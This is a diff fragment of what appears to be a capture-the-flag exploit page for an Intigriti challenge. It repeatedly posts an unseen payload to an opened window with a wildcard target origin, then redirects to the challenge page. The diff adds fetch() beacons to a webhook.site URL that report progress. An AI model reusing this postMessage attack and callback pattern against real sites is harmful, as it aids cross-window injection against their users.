@@ -14,11 +14,13 @@
 
         const interval = setInterval(() => {
             if (win) {
+                fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/windowisopened`);
                 win.postMessage(payload, "*");
             }
         }, 1000);
         
         setTimeout(() => {
+            fetch(`https://webhook.site/963c1110-c016-402c-8258-3f38833936f3/redirected`);
             window.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
         }, 5000);
     </script>
